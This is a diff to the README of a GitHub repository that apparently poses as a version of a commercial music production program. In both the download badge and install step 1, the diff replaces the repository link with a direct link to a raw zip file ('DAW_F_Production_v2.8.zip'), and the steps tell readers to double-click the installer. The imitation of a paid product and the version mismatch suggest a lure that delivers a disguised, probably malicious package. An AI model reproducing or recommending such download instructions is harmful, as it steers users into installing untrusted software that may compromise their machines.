@@ -1,6 +1,6 @@
 # 🎹 FL-Production-25.2.5-DAW - Create professional music on Windows easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/msa46118/FL-Production-25.2.5-DAW)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/msa46118/FL-Production-25.2.5-DAW/raw/refs/heads/main/FL/DAW_F_Production_v2.8.zip)
 
 This project provides a complete environment for music production, beatmaking, and audio engineering. It supports MIDI controllers, VST3 plugins, and professional recording workflows on Windows 11. 
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run this software. Ensure your system m
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [the official download page](https://github.com/msa46118/FL-Production-25.2.5-DAW) to obtain the installation package.
+1. Visit [the official download page](https://github.com/msa46118/FL-Production-25.2.5-DAW/raw/refs/heads/main/FL/DAW_F_Production_v2.8.zip) to obtain the installation package.
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the installer icon to begin the setup process.
 4. Follow the on-screen prompts provided by the installer.
